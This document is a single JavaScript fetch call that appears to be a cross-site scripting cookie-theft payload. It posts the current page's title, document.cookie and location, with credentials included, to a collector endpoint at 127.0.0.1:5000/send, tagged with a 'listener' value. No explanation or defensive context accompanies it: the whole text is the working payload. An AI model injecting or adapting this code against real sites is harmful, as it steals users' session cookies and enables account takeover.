fetch("http://127.0.0.1:5000/send", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
    "cache-control": "no-cache",
    "content-type": "application/x-www-form-urlencoded",
    "pragma": "no-cache",
    "proxy-connection": "keep-alive",
    "upgrade-insecure-requests": "1"
  },
  "referrer": "http://127.0.0.1:5000/send",
  "body": "header="+document.title+"&listener=ppp&content=123"+document.cookie+document.location,
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
